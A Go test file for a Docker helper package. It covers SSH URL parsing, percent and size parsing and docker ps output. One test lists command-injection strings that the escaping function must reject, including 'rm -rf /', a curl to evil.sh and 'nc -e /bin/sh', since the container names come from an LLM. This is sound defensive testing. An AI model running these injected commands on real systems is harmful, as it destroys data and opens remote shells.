package dockerx

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestParseSSHURL(t *testing.T) {
	cases := []struct {
		in      string
		user    string
		host    string
		port    string
		wantErr bool
	}{
		{"ssh://root@192.168.1.114", "root", "192.168.1.114", "22", false},
		{"ssh://dev@10.0.0.5:2222", "dev", "10.0.0.5", "2222", false},
		{"ssh://10.0.0.5", "", "", "", true},     // 缺用户名
		{"ssh://", "", "", "", true},             // 缺主机
		{"tcp://1.2.3.4:2375", "", "", "", true}, // 非 ssh 协议
	}
	for _, c := range cases {
		got, err := parseSSHURL(c.in)
		if c.wantErr {
			if err == nil {
				t.Errorf("parseSSHURL(%q) expected error", c.in)
			}
			continue
		}
		if err != nil {
			t.Errorf("parseSSHURL(%q): %v", c.in, err)
			continue
		}
		if got.user != c.user || got.host != c.host || got.port != c.port {
			t.Errorf("parseSSHURL(%q) = %+v", c.in, got)
		}
	}
}

func TestQuoteArgInjection(t *testing.T) {
	// 合法容器名/ID 放行并加单引号
	if q, err := quoteArg("web-app_1"); err != nil || q != "'web-app_1'" {
		t.Fatalf("quoteArg(web-app_1) = %q err=%v", q, err)
	}
	if q, err := quoteArg("a1b2c3d4e5f6"); err != nil || q != "'a1b2c3d4e5f6'" {
		t.Fatalf("quoteArg(hex id) = %q err=%v", q, err)
	}
	// 注入攻击向量全部拒绝（来自 LLM 的容器名是外部输入）
	attacks := []string{
		"web; rm -rf /",
		"$(whoami)",
		"`id`",
		"web && curl evil.sh",
		"web | nc -e /bin/sh",
		"-v /etc:/host", // 前导连字符：防止被当成 docker 参数
		"",
	}
	for _, a := range attacks {
		if _, err := quoteArg(a); err == nil {
			t.Errorf("quoteArg(%q) should be rejected", a)
		}
	}
}

func TestParsePercent(t *testing.T) {
	if v, err := parsePercent("0.50%"); err != nil || v != 0.5 {
		t.Fatalf("parsePercent(0.50%%) = %v err=%v", v, err)
	}
	if v, err := parsePercent(" 12%"); err != nil || v != 12 {
		t.Fatalf("parsePercent(12%%) = %v err=%v", v, err)
	}
	if _, err := parsePercent("abc"); err == nil {
		t.Fatal("parsePercent(abc) expected error")
	}
}

func TestParseSizeBytes(t *testing.T) {
	cases := []struct {
		in   string
		want int64
	}{
		{"936B", 936},
		{"0B", 0},
		{"1.1kB", 1100},       // SI 1000 进制
		{"1.205MiB", 1263534}, // 二进制 1024 进制：1.205*1024*1024
		{"15.38GiB", 16513488978},
	}
	for _, c := range cases {
		got, err := parseSizeBytes(c.in)
		if err != nil {
			t.Errorf("parseSizeBytes(%q): %v", c.in, err)
			continue
		}
		// 浮点换算允许 0.1% 误差
		diff := got - c.want
		if diff < 0 {
			diff = -diff
		}
		if float64(diff) > float64(c.want)*0.001+1 {
			t.Errorf("parseSizeBytes(%q) = %d, want %d", c.in, got, c.want)
		}
	}
	if _, err := parseSizeBytes("hello"); err == nil {
		t.Fatal("parseSizeBytes(hello) expected error")
	}
}

func TestParsePsJSONL(t *testing.T) {
	// 模拟 docker ps -a --format json 的两行输出（JSON Lines：每行一个对象）
	out := `{"ID":"abc123def456","Names":"web-app","Image":"nginx:latest","State":"running","Status":"Up 2 hours","Ports":"0.0.0.0:8080->80/tcp"}
{"ID":"deadbeef0000","Names":"/order-service","Image":"java:17","State":"exited","Status":"Exited (1) 5 minutes ago","Ports":""}`
	var lines []psLine
	for _, line := range strings.Split(out, "\n") {
		var p psLine
		if err := json.Unmarshal([]byte(line), &p); err != nil {
			t.Fatalf("unmarshal: %v", err)
		}
		lines = append(lines, p)
	}
	if len(lines) != 2 {
		t.Fatalf("expected 2 lines, got %d", len(lines))
	}
	if lines[0].ID != "abc123def456" || lines[0].Names != "web-app" || lines[0].State != "running" {
		t.Fatalf("line0 mismatch: %+v", lines[0])
	}
	// 部分 docker 版本 Names 带 / 前缀，由 ListContainers 统一 TrimPrefix
	if strings.TrimPrefix(lines[1].Names, "/") != "order-service" {
		t.Fatalf("line1 name mismatch: %+v", lines[1])
	}
}
